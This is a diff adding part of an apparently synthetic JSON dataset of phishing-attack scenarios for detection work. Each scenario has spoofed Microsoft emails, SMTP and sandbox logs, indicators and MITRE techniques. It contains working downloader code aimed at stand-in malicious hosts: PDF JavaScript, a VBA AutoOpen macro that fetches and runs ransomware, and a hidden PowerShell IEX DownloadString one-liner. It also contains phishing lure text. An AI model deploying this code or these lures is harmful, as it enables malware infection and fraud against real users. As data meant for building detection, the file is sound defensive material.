+          "md5": "a3f5e6d7c4b8f2d3a9e1b7c6d5f8a2b3",
+          "sha1": "b1d2c3e4f56789a0b1c2d3e4f5a6b7c8d9e0f1a2",
+          "sha256": "c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\John\\AppData\\Local\\Temp\\payload.ps1",
+          "network_connection": "TCP Connect to 203.0.113.76:80",
+          "process_spawned": "powershell.exe",
+          "process_command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\John\\AppData\\Local\\Temp\\payload.ps1",
+          "dns_requests": [
+            "updateserver.net"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain micros0ft-update.com is a homoglyph of microsoft.com",
+        "Macro-enabled Excel document (.xlsm) with auto-open macro",
+        "VBA macro downloads and executes PowerShell script from suspicious domain",
+        "Suspicious domain recently registered in China",
+        "Outbound HTTP connection to 203.0.113.76 on port 80",
+        "Execution of PowerShell payload from user's TEMP directory"
+      ],
+      "detection_method": "Email gateway flags SPF fail and suspicious attachment; sandbox environment detects macro execution and PowerShell invocation; endpoint EDR logs PowerShell process spawned from Excel; DNS monitoring shows resolution of updateserver.net; user reports unexpected Excel attachment.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Phishing email with PDF attachment containing embedded JavaScript that exploits a vulnerability to download and execute a remote trojan.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alerts@secure-microsoft.com>\r\nReceived: from mail.secure-microsoft.com (mail.secure-microsoft.com [203.0.113.25])\r\n\tby inbound.corpnet.com (Postfix) with ESMTPS id 4D6E7890AB\r\n\tfor <alice.smith@corpnet.com>; Fri, 02 Jun 2023 08:45:10 +0000 (UTC)\r\nReceived-SPF: neutral (corpnet.com: domain of alerts@secure-microsoft.com does not designate 203.0.113.25 as permitted sender) receiver=inbound.corpnet.com; client-ip=203.0.113.25; envelope-from=alerts@secure-microsoft.com; helo=mail.secure-microsoft.com;\r\nFrom: \"Microsoft Alerts\" <alerts@secure-microsoft.com>\r\nTo: alice.smith@corpnet.com\r\nSubject: Security Alert: Immediate Action Required\r\nMessage-ID: <20230602084510.4D6E7890AB@mail.secure-microsoft.com>\r\nDate: Fri, 02 Jun 2023 08:45:10 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_13579_24680\"",
+        "email_body": "------=_Part_13579_24680\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear User,\r\n\r\nA critical security vulnerability has been detected in your software. Please open the attached PDF file and follow the instructions to patch your system.\r\n\r\nRegards,\r\nMicrosoft Security Team\r\n------=_Part_13579_24680\r\nContent-Type: application/pdf; name=\"Security_Update.pdf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Security_Update.pdf\"\r\n\r\nJVBERi0xLjQKJeLjz9MKMSAwIG9iago8PC9UeXBlIC9DYXRhbG9nL1BhZ2VzIDIgMCBSCj4+\r\nZW5kb2JqCgoKMiAwIG9iago8PC9UeXBlIC9QYWdlcy9LaWRzIFsgMyAwIFIgXQo+PgplbmRv\r\nYmoKCgozIDAgb2JqCjw8L1R5cGUgL1BhZ2UvUGFyZW50IDIgMCBSL1Jlc291cmNlcyA0IDAg\r\nUi9NZWRpYUJveCBbMCAwIDU5NSA4NDJdL0NvbnRlbnRzIDUgMCBSCj4+CmVuZG9iagoKCjUg\r\nMCBvYmoKKFtc2NyaXB0IGV4cGxvaXQgY29kZV0pCmVuZG9iagoKPDwvVHlwZSAvUGFnZVN0\r\ncmVhbS9Db250ZW50cyA2IDAgUi9Qcm9jU2V0Wy9QREYgL1RleHRdPj4KZW5kc3RyZWFtCmVu\r\nZG9iagoKNiAwIG9iago8PC9MZW5ndGggMTIzPj4Kc3RyZWFtCgpkb2N1bWVudC5kYXRhID0g\r\nUmVxdWVzdC5nZXRSZXNvdXJjZSgnaHR0cDovL21hbGljaW91cy1zZXJ2ZXIuY29tL3BheWxv\r\nYWQuZXhlJyk7CmVuZHN0cmVhbQplbmRvYmoKZW5kb2JqCnhyZWYKMCA3CjAwMDAwMDAwMDAg\r\nNjU1MzUgZiAKMDAwMDAwMDExMCAwMDAwMCBuIAowMDAwMDAwMjEyIDAwMDAwIG4gCjAwMDAw\r\nMDAzMjMgMDAwMDAgbiAKMDAwMDAwMDQzNCAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgNy9S\r\nb290IDEgMCBSL0luZm8gNyAwIFIvSURbPDI3MTg5NjM3ZjQzNjcyNzAwMDAwMDAwMDAwMDAw\r\nMDA+XTwvSW5kZXggWzMgMCBSXT4+CnN0YXJ0eHJlZgo0NDUKJSVFT0YK",
+        "smtp_transaction_log": "220 mail.secure-microsoft.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.secure-microsoft.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<alerts@secure-microsoft.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<alice.smith@corpnet.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email body with PDF attachment]\r\n.\r\n250 2.0.0 Ok: queued as 4D6E7890AB\r\nQUIT\r\n221 2.0.0 Bye",
+        "extracted_pdf_javascript": "var url = \"http://malicious-server.com/payload.exe\";\nvar req = new XMLHttpRequest();\nreq.open('GET', url, false);\nreq.send();\nif (req.status == 200) {\n  var stream = util.stringFromStream(req.responseBody);\n  var file = util.saveToFile(stream, 'C:\\\\Users\\\\Alice\\\\AppData\\\\Local\\\\Temp\\\\payload.exe');\n  app.launchURL('file://' + file, true);\n}",
+        "attachment_file_hashes": {
+          "md5": "e9b1c4d2f1a5b6c7d8e9f0a1b2c3d4e5",
+          "sha1": "f2a3b4c5d6e7f8091a2b3c4d5e6f7a8b9c0d1e2f",
+          "sha256": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Alice\\AppData\\Local\\Temp\\payload.exe",
+          "network_connection": "TCP Connect to 203.0.113.120:80",
+          "process_spawned": "payload.exe",
+          "process_command_line": "C:\\Users\\Alice\\AppData\\Local\\Temp\\payload.exe",
+          "dns_requests": [
+            "malicious-server.com"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain secure-microsoft.com is a lookalike domain",
+        "PDF attachment contains embedded JavaScript exploiting vulnerability",
+        "JavaScript downloads and executes Windows PE payload",
+        "Outbound HTTP request to malicious-server.com",
+        "Execution of dropped payload.exe in user TEMP directory"
+      ],
+      "detection_method": "Sandbox detonates PDF and detects JavaScript execution and network activity; endpoint monitors creation and execution of unknown executables; network IDS triggers on HTTP connection to known malicious domain; email gateway flags suspicious sender domain.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.007 - Command and Scripting Interpreter: JavaScript",
+        "T1105 - Ingress Tool Transfer",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Phishing email with RTF attachment exploiting Equation Editor vulnerability to drop and execute a remote downloader.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@m1crosoft-update.net>\r\nReceived: from mail.m1crosoft-update.net (mail.m1crosoft-update.net [192.0.2.101])\r\n\tby mx.enterprise.com (Postfix) with ESMTPS id 1A2B3C4D5E\r\n\tfor <admin@enterprise.com>; Tue, 04 Jul 2023 14:33:50 +0000 (UTC)\r\nReceived-SPF: fail (enterprise.com: domain of support@m1crosoft-update.net does not designate 192.0.2.101 as permitted sender) receiver=mx.enterprise.com; client-ip=192.0.2.101; envelope-from=support@m1crosoft-update.net; helo=mail.m1crosoft-update.net;\r\nFrom: \"Microsoft Support\" <support@m1crosoft-update.net>\r\nTo: admin@enterprise.com\r\nSubject: Important: Document attached for review\r\nMessage-ID: <20230704143350.1A2B3C4D5E@mail.m1crosoft-update.net>\r\nDate: Tue, 04 Jul 2023 14:33:50 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_112233_445566\"",
+        "email_body": "------=_Part_112233_445566\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear User,\r\n\r\nPlease review the attached document and provide your feedback at your earliest convenience.\r\n\r\nBest regards,\r\nMicrosoft Support Team\r\n------=_Part_112233_445566\r\nContent-Type: application/rtf; name=\"Review_Document.rtf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Review_Document.rtf\"\r\n\r\ne1xydGYxXGFuc2lcZXh0ZW5zaW9ufQp7XGFjc3lkc2l6ZVwxMjM0fQp7XHBhcmVudHN9Cg==\r\n... (truncated base64 RTF exploiting eqnedt32.exe vulnerability) ...",
+        "smtp_transaction_log": "220 mail.m1crosoft-update.net ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.m1crosoft-update.net\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<support@m1crosoft-update.net>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Microsoft Support\" <support@m1crosoft-update.net>\r\nTo: admin@enterprise.com\r\nSubject: Important: Document attached for review\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 1A2B3C4D5E\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_exploit_behavior": "The RTF file contains a crafted object that triggers CVE-2017-11882 (Microsoft Equation Editor remote code execution) vulnerability, which downloads a payload from http://update-server.org/downloader.exe and executes it.",
+        "attachment_file_hashes": {
+          "md5": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6",
+          "sha1": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0",
+          "sha256": "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2"
+        },
+        "malicious_domain_registration": {
+          "domain": "update-server.org",
+          "registrar": "PDR Ltd. d/b/a PublicDomainRegistry.com",
+          "creation_date": "2023-06-20T10:45:00Z",
+          "registrant_country": "UA",
+          "name_servers": [
+            "ns1.publicdomainregistry.com",
+            "ns2.publicdomainregistry.com"
+          ]
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\Admin\\AppData\\Local\\Temp\\downloader.exe",
+          "network_connection": "TCP Connect to 192.0.2.150:80",
+          "process_spawned": "downloader.exe",
+          "process_command_line": "C:\\Users\\Admin\\AppData\\Local\\Temp\\downloader.exe",
+          "dns_requests": [
+            "update-server.org"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain m1crosoft-update.net is a homoglyph domain impersonating microsoft.com",
+        "RTF attachment exploits Equation Editor vulnerability (CVE-2017-11882)",
+        "Malicious downloader fetched from recently registered domain update-server.org",
+        "Outbound HTTP connection to 192.0.2.150 on port 80",
+        "Execution of downloader.exe dropped in user TEMP directory"
+      ],
+      "detection_method": "Sandbox executes RTF and detects exploit triggering code; endpoint EDR logs execution of unknown binary from TEMP; DNS logs reveal resolution of update-server.org; email gateway flags suspicious sender domain and attachment; user reports unexpected attachment.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1203 - Exploitation for Client Execution",
+        "T1105 - Ingress Tool Transfer",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Phishing email with a malicious PowerPoint presentation containing embedded VBA macro that downloads and runs a ransomware payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <notifications@microsoft-secure.net>\r\nReceived: from mail.microsoft-secure.net (mail.microsoft-secure.net [198.51.100.80])\r\n\tby mail.enterprise.org (Postfix) with ESMTPS id 8F7E6543DC\r\n\tfor <ceo@enterprise.org>; Wed, 12 Jul 2023 16:10:30 +0000 (UTC)\r\nReceived-SPF: fail (enterprise.org: domain of notifications@microsoft-secure.net does not designate 198.51.100.80 as permitted sender) receiver=mail.enterprise.org; client-ip=198.51.100.80; envelope-from=notifications@microsoft-secure.net; helo=mail.microsoft-secure.net;\r\nFrom: \"Microsoft Notifications\" <notifications@microsoft-secure.net>\r\nTo: ceo@enterprise.org\r\nSubject: Security Notification: Immediate Attention Required\r\nMessage-ID: <20230712161030.8F7E6543DC@mail.microsoft-secure.net>\r\nDate: Wed, 12 Jul 2023 16:10:30 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_998877_665544\"",
+        "email_body": "------=_Part_998877_665544\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\n<html><body>\r\n<p>Dear User,</p>\r\n<p>A new security notification has been issued. Please open the attached PowerPoint file and enable macros to view the details.</p>\r\n<p>Regards,<br>Microsoft Security Team</p>\r\n</body></html>\r\n------=_Part_998877_665544\r\nContent-Type: application/vnd.ms-powerpoint.presentation.macroEnabled.12; name=\"Security_Notification.pptm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Security_Notification.pptm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\r\n... (truncated base64 PowerPoint macro document) ...",
+        "smtp_transaction_log": "220 mail.microsoft-secure.net ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.microsoft-secure.net\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<notifications@microsoft-secure.net>\r\n250 2.1.0 Ok\r\nRCPT TO:<ceo@enterprise.org>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: \"Microsoft Notifications\" <notifications@microsoft-secure.net>\r\nTo: ceo@enterprise.org\r\nSubject: Security Notification: Immediate Attention Required\r\n\r\n[Email body with attachment]\r\n.\r\n250 2.0.0 Ok: queued as 8F7E6543DC\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_macro_vba": "Sub AutoOpen()\r\n    Dim strURL As String\r\n    Dim strFile As String\r\n    strURL = \"http://ransom-servers.com/ransomware.exe\"\r\n    strFile = Environ(\"TEMP\") & \"\\ransomware.exe\"\r\n    Dim xmlHttp As Object\r\n    Set xmlHttp = CreateObject(\"MSXML2.XMLHTTP\")\r\n    xmlHttp.Open \"GET\", strURL, False\r\n    xmlHttp.Send\r\n    If xmlHttp.Status = 200 Then\r\n        Dim adoStream As Object\r\n        Set adoStream = CreateObject(\"ADODB.Stream\")\r\n        adoStream.Open\r\n        adoStream.Type = 1 'binary\r\n        adoStream.Write xmlHttp.responseBody\r\n        adoStream.Position = 0\r\n        adoStream.SaveToFile strFile, 2\r\n        adoStream.Close\r\n        Shell strFile, vbHide\r\n    End If\r\nEnd Sub",
+        "malicious_domain_registration": {
+          "domain": "ransom-servers.com",
+          "registrar": "Tucows Domains Inc.",
+          "creation_date": "2023-07-01T09:00:00Z",
+          "registrant_country": "BR",
+          "name_servers": [
+            "ns1.tucows.com",
+            "ns2.tucows.com"
+          ]
+        },
+        "attachment_file_hashes": {
+          "md5": "d2c7e3f4a5b6c7d8e9f0a1b2c3d4e5f6",
+          "sha1": "e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2",
+          "sha256": "f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5"
+        },
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\CEO\\AppData\\Local\\Temp\\ransomware.exe",
+          "network_connection": "TCP Connect to 198.51.100.99:80",
+          "process_spawned": "ransomware.exe",
+          "process_command_line": "C:\\Users\\CEO\\AppData\\Local\\Temp\\ransomware.exe",
+          "dns_requests": [
+            "ransom-servers.com"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain microsoft-secure.net is a spoofed domain impersonating microsoft.com",
+        "Macro-enabled PowerPoint presentation (.pptm) with auto-open macro",
+        "VBA macro downloads and executes ransomware payload from suspicious domain",
+        "Outbound HTTP connection to 198.51.100.99",
+        "Execution of ransomware.exe in user TEMP directory"
+      ],
+      "detection_method": "Email security gateway detects suspicious attachment and SPF fail; sandbox environment triggers macro execution and network activity; endpoint AV detects unknown executable creation and execution; DNS monitoring flags domain ransom-servers.com; user reports suspicious email.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic",
+        "T1105 - Ingress Tool Transfer",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Phishing email containing a compressed archive (.7z) with a malicious LNK shortcut that executes a PowerShell downloader script.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alerts@secure-micros0ft.com>\r\nReceived: from mail.secure-micros0ft.com (mail.secure-micros0ft.com [203.0.113.90])\r\n\tby mail.corp.net (Postfix) with ESMTPS id 7E6F5432BA\r\n\tfor <user@corp.net>; Mon, 24 Jul 2023 10:15:00 +0000 (UTC)\r\nReceived-SPF: neutral (corp.net: domain of alerts@secure-micros0ft.com does not designate 203.0.113.90 as permitted sender) receiver=mail.corp.net; client-ip=203.0.113.90; envelope-from=alerts@secure-micros0ft.com; helo=mail.secure-micros0ft.com;\r\nFrom: \"Microsoft Security Alerts\" <alerts@secure-micros0ft.com>\r\nTo: user@corp.net\r\nSubject: Security Patch Update\r\nMessage-ID: <20230724101500.7E6F5432BA@mail.secure-micros0ft.com>\r\nDate: Mon, 24 Jul 2023 10:15:00 +0000\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_1357924680_2468013579\"",
+        "email_body": "------=_Part_1357924680_2468013579\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear User,\r\n\r\nAttached is the latest security patch. Please extract the archive and run the included shortcut to apply the update.\r\n\r\nBest regards,\r\nMicrosoft Security Team\r\n------=_Part_1357924680_2468013579\r\nContent-Type: application/x-7z-compressed; name=\"Patch_Archive.7z\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Patch_Archive.7z\"\r\n\r\nN3owMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw\r\n... (truncated base64 7z archive) ...",
+        "extracted_lnk_content": "Shortcut target: powershell.exe\r\nArguments: -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://downloads.malicious-site.org/downloader.ps1')\"",
+        "smtp_transaction_log": "220 mail.secure-micros0ft.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.secure-micros0ft.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<alerts@secure-micros0ft.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<user@corp.net>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email body with 7z attachment]\r\n.\r\n250 2.0.0 Ok: queued as 7E6F5432BA\r\nQUIT\r\n221 2.0.0 Bye",
+        "attachment_file_hashes": {
+          "7z_md5": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0",
+          "lnk_sha256": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0"
+        },
+        "network_artifacts": {
+          "dns_request": "downloads.malicious-site.org",
+          "http_get_request": "GET /downloader.ps1 HTTP/1.1\r\nHost: downloads.malicious-site.org\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: Close\r\n\r\n",
+          "http_response": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 1024\r\n\r\n[PowerShell downloader script]"
+        },
+        "process_creation_chain": [
+          "explorer.exe -> shortcut.lnk",
+          "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command IEX ..."
+        ],
+        "registry_changes": [],
+        "sandbox_behavior_log": {
+          "file_created": "C:\\Users\\User\\AppData\\Local\\Temp\\downloader.ps1",
+          "network_connection": "TCP Connect to 198.51.100.200:80",
+          "process_spawned": "powershell.exe",
+          "process_command_line": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://downloads.malicious-site.org/downloader.ps1')",
+          "dns_requests": [
+            "downloads.malicious-site.org"
+          ]
+        }
+      },
+      "indicators": [
+        "Sender domain secure-micros0ft.com is a homoglyph of microsoft.com",
+        "7z archive attachment contains malicious LNK shortcut",
+        "LNK shortcut executes obfuscated PowerShell downloader script",
+        "Outbound HTTP request to downloads.malicious-site.org",
+        "Powershell.exe spawned with hidden window and bypassed execution policy"
+      ],
+      "detection_method": "Email security gateway detects suspicious attachment and SPF neutral; sandbox executes LNK and observes PowerShell invocation; endpoint monitors powershell.exe with suspicious command line; network IDS alerts on HTTP GET request to known malicious domain; user reports unexpected attachment.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1105 - Ingress Tool Transfer"
+      ]
+    }
+  ]
+}
